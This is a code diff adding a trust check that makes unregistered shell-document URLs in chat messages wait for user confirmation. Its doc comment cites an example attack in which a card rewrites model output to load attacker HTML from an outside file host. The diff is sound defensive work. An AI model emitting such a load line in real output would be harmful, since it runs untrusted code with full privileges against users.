@@ -49,6 +49,40 @@ export function classifyShellUrl(url) {
 }
 
 /**
+ * Split message-mounted shells into auto-mountable and confirm-gated (H3).
+ *
+ * Shell documents get full bridge privileges, so a `.load(url)` appearing in
+ * message display_content is a code-execution decision, not a resource fetch.
+ * Only URLs registered in the card's own shell manifest (extracted at import)
+ * mount automatically; anything else — e.g. a card regex rewriting model
+ * output to `.load('https://files.catbox.moe/<attacker>.html')` — must be
+ * explicitly approved by the user for this session.
+ *
+ * @param {Array<{url:string, kind:string}>} mounts
+ * @param {Array<string> | null | undefined} trustedUrls card-manifest URLs
+ * @param {Array<string> | null | undefined} approvedUrls user-approved URLs
+ * @returns {{ allowed: Array<object>, needsConfirmation: Array<object> }}
+ */
+export function partitionShellMountsByTrust(mounts, trustedUrls = [], approvedUrls = []) {
+  const norm = (u) => String(u || '').trim()
+  const toSet = (urls) =>
+    new Set((Array.isArray(urls) ? urls : []).map(norm).filter(Boolean))
+  const trusted = toSet(trustedUrls)
+  const approved = toSet(approvedUrls)
+  const allowed = []
+  const needsConfirmation = []
+  for (const mount of Array.isArray(mounts) ? mounts : []) {
+    const url = norm(mount?.url)
+    if (url && (trusted.has(url) || approved.has(url))) {
+      allowed.push(mount)
+    } else {
+      needsConfirmation.push(mount)
+    }
+  }
+  return { allowed, needsConfirmation }
+}
+
+/**
  * Prefer message-local shell mounts; fall back to campaign-level status URL.
  * @param {Array<{url:string, kind:string}>} mounts
  * @param {{ statusUrl?: string|null, openingUrl?: string|null }} fallback
